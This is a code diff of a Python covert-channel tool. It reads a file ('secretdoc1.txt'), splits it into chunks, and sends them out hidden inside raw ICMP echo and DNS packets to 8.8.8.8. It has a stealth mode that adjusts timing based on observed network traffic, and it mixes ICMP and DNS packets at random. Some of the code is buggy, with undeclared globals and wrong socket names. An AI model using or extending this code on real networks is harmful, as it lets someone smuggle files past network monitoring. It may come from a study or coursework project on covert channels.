@@ -22,7 +22,7 @@ u_short     = c_ushort
 
 chunkLength         = 20
 completedTransfer   = False
-currentFilePath     = "secretdoc.txt"
+currentFilePath     = "secretdoc1.txt"
 exfilBytes          = b''
 ICMP_ECHO_REPLY     = 0
 ICMP_ECHO_REQUEST   = 8
@@ -43,10 +43,12 @@ mixedOnly   = False
 
 monitorThread = None
 
+
 class ICMPPacket:
-    def __init__(self, type, code):
+    def __init__(self, type, code, data):
         self.type = type
         self.code = code
+        self.data = data
 
     def computeChecksum():
         return
@@ -57,9 +59,10 @@ class ICMPPacket:
         icmpHeader = struct.pack("bbHHh", self.type, self.code, 0, packetId, 0)
         return icmpHeader
 
-    def fill():
-        # Data will be stored in ICMP and DNS packets differently, so use fill methods specific to packet type
-        return
+    def construct(self):
+        header = self.getHeader()
+        return header + self.data
+
     
 class DNSPacket:
     def __init__(self, data):
@@ -72,10 +75,10 @@ class DNSPacket:
     def getHeader(self, length):
         # ID (16), QR(1), OpCode(4), AA(1), TC(1), RD(1), RA(1), Z(1), RCode(16), QDCount(16), ANCount(16), NSCount(16), ARCount(16)
         # All flags are 0 so we can just use an unsigned short (16 bytes) of 0
-        # DNS uses UDP so create UDP header first
 
         packetId = int((id(self) * random.random()) % 65535)
         
+        # DNS uses UDP so create UDP header first
         #udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(8 + 18 + 4*math.ceil(chunkLength/3)), 0)
         udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(length), 0)
         dnsHeader = struct.pack("HHHHHH", socket.htons(packetId), 0, socket.htons(1), 0, 0, 0)
@@ -106,6 +109,7 @@ def main(q):
 
     args = parser.parse_args()
 
+    # Check constraints on arguments
     ret = False
     if args.stealth & args.fast:
         print("Error: -s and -f are mutually exclusive")
@@ -113,7 +117,11 @@ def main(q):
     if args.icmp & args.dns:
         print("Error: Use -m for ICMP and DNS")
         ret = True
+    if (args.icmp | args.dns) & args.mixed:
+        print("Error: Use -m without -i or -d")
+        ret = True
     if ret:
+        # Return after all errors have been printed
         return
 
     stealthMode = args.stealth
@@ -129,8 +137,11 @@ def main(q):
     
 def init():
     global exfilBytes
+    global sendSocket
+    
     startByte = 0
     exfilBytes = readFile(currentFilePath, "rb")
+    sendSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW)
 
     if stealthMode:     
         monitorThread = threading.Thread(None, monitorNetwork)
@@ -139,14 +150,14 @@ def init():
 
 def loop():
 
-    if fastMode:
+    if stealthMode:
         k = 48 # Constant of proportionality between delay and ppi
         localPPI = updatedPPI
         delay = k / localPPI
 
     # While the whole file hasn't be exfiltrated
     while startByte < (len(exfilBytes) - 1):
-        if fastMode:       
+        if stealthMode:       
             print("localPPI: %d updatedPPI: %d" % (localPPI, updatedPPI))
             # If the monitor has updated the PPI value, then update the delay between packets
             if localPPI != updatedPPI:
@@ -156,24 +167,45 @@ def loop():
                 print("New delay: %f" % (delay))        
 
         # Send next chunk
-        sendNext("8.8.8.8", UDP_PROTOCOL)
-        print("Packet sent")
+        nextPacketType = getNextPacketType()
+        if nextPacketType == ICMP_PROTOCOL:
+            print("ICMP packet sent")
+            packet = createICMPPacket()
+        elif nextPacketType == UDP_PROTOCOL:
+            print("DNS packet sent")
+            packet = createDNSPacket()
+        sendNext("8.8.8.8", nextPacketType, packet)
 
-        if fastMode:
+        if stealthMode:
             time.sleep(delay)
-    return
+
+    sendEndOfFile()
 
     completedTransfer = True
+
+    return
     
+def getNextPacketType():
+    if icmpOnly:
+        print("Packet type: ICMP")
+        return ICMP_PROTOCOL
+    elif dnsOnly:
+        print("Packet type: DNS")
+        return UDP_PROTOCOL
+    else:
+        protos = [ICMP_PROTOCOL, UDP_PROTOCOL]
+        return protos[math.floor(random.random() * len(protos))]
+
 def createICMPPacket():
-    icmpPacket = ICMPPacket(ICMP_ECHO_REQUEST, 0)
-    icmpHeader = icmpPacket.getHeader()
     data = getNextChunk(startByte, chunkLength)
+    icmpPacket = ICMPPacket(ICMP_ECHO_REQUEST, 0, data).construct()
     
-    return icmpHeader #+ data
+    return icmpPacket
 
 def createDNSPacket():
     queryHostname = b''
+    #fileData = getNextChunk(startByte, 248)
+    #queryHostname = prepareDataForDNS(fileData)
 
     if fastMode == True:
         print("Creating fast mode DNS packet")
@@ -187,7 +219,6 @@ def createDNSPacket():
 
         queryHostname += (0).to_bytes(1, "big") # Add null terminating byte to domain name
     else:
-        print("Hey")
         # Adjust chunk length accordingly
         for i in range(0, 4):
             chunkLength = math.floor(random.random() * 30)
@@ -225,11 +256,11 @@ def getNextChunk(sb, cl):
     return chunk
 
 def sendStartOfFile():
-    #createPacket(1)
     return
     
 def sendEndOfFile():
-    #createPacket(2)
+    content =  DNSPacket((9).to_bytes(1, "little") + "Completed".encode()  + (0).to_bytes(1, "little")).construct()
+    sendNext("8.8.8.8", UDP_PROTOCOL, content)
     return
     
 def stringToBin(s):
@@ -259,31 +290,30 @@ def readFile(name, mode):
         f.close()
     return fileBytes
 
-def sendNext(dest_addr, code, timeout=1):
-    try:
-        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, code)
-    except socket.error as e:
-        #if e.errno in ERROR_DESCR:
-            # Operation not permitted
-        #    raise socket.error(''.join((e.args[1], ERROR_DESCR[e.errno])))
-        raise # raise the original error
+def sendNext(dest_addr, code, packet, timeout=1):
     try:
         host = socket.gethostbyname(dest_addr)
     except socket.gaierror:
-        return
-    # Maximum for an unsigned short int c object counts to 65535 so
-    # we have to sure that our packet id is not greater than that.
-    #packet = createICMPPacket()
-    packet = createDNSPacket()
+        return 
     while packet:
         # The icmp protocol does not use a port, but the function
         # below expects it, so we just give it a dummy port.
-        sent = my_socket.sendto(packet, (dest_addr, 1))
+        if code == ICMP_PROTOCOL:
+            print("Sending ICMP packet")
+            sent = sendSocket.sendto(packet, (dest_addr, 1))
+        elif code == UDP_PROTOCOL:
+            print("Sending DNS packet")
+            sent = sendSocket.sendto(packet, (dest_addr, 53))
         packet = packet[sent:]
-    #delay = receive_ping(my_socket, packet_id, time.time(), timeout)
-    my_socket.close()
-    #return delay
+
     return
+
+def closeAllSocket():
+    try:
+        sendICMPSocket.close()
+        sendDNSSocket.close()
+    except e:
+        print(e)
 
 class ip_address(Structure):
     _fields_ = [("byte1", u_char),
